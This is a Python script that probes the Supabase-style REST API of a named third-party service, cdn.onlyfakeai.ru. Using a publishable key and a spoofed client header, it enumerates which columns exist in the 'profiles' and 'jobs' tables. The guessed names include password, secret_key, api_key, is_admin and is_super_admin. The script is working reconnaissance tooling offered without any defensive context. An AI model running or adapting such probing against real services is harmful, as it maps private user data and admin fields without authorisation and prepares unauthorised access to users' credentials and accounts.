import ssl, json, urllib.request, urllib.error

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

def req(method, path, body=None, extra=None):
    h = {
        "User-Agent": "Mozilla/5.0",
        "apikey": KEY,
        "Authorization": f"Bearer {KEY}",
        "X-Client-Info": "supabase-js/2.49.4",
        "Prefer": "return=representation",
    }
    if extra:
        h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

cols = [
    "id", "user_id", "uuid", "email", "username", "name", "full_name",
    "credits", "plan", "plan_type", "plan_name", "banned", "is_banned",
    "is_admin", "role", "roles", "secret_key", "api_key", "avatar_url",
    "telegram_id", "telegram_username", "created_at", "updated_at",
    "last_login", "password", "provider", "subscription", "tier",
    "watermark_free", "no_watermark", "attempts", "is_super_admin",
    "admin", "staff", "permissions", "premium",
]

print("=== profiles column oracle (200 = exists) ===")
for c in cols:
    st, txt = req("GET", f"/rest/v1/profiles?select={c}&limit=1")
    marker = "OK " if st == 200 else ("?" + str(st))
    print(f"{marker:5} {c}")

print("\n=== jobs column oracle ===")
jobs_cols = [
    "id", "user_id", "email", "status", "type", "doc_type", "document_type",
    "country", "created_at", "updated_at", "input_path", "output_path",
    "result", "error", "attempts", "watermark", "credits_used", "job_id",
]
for c in jobs_cols:
    st, txt = req("GET", f"/rest/v1/jobs?select={c}&limit=1")
    marker = "OK " if st == 200 else ("?" + str(st))
    print(f"{marker:5} {c}")
